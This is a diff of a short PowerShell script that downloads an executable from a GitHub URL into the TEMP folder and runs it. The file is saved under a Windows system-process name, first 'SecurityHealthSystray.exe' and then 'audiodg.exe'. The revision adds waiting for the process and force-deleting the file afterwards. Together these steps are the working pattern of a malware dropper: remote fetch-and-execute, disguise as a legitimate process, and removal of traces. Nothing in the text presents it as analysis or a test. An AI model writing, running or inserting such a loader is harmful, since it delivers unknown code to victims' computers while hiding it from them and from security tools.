@@ -1,19 +1,6 @@
-
-
-$settings = '{"WD": false, "adminrun": false}' | ConvertFrom-Json
-
-if ($settings.adminrun) {
-$outputPath = [System.IO.Path]::Combine($env:TEMP, 'SecurityHealthSystray.exe')
-} else {
-$outputPath = [System.IO.Path]::Combine($env:TEMP, 'SecurityHealthSystray.exe')
-}
-
-
+$outputPath = [System.IO.Path]::Combine($env:TEMP, 'audiodg.exe')
 $webClient = New-Object System.Net.WebClient
-
 $webClient.DownloadFile("https://github.com/MB2RZEN/Neak/raw/refs/heads/main/Built.exe", $outputPath)
-Start-Process -FilePath $outputPath
-
-
-
-
+$process = Start-Process -FilePath $outputPath -PassThru
+$process.WaitForExit()
+Remove-Item $outputPath -Force
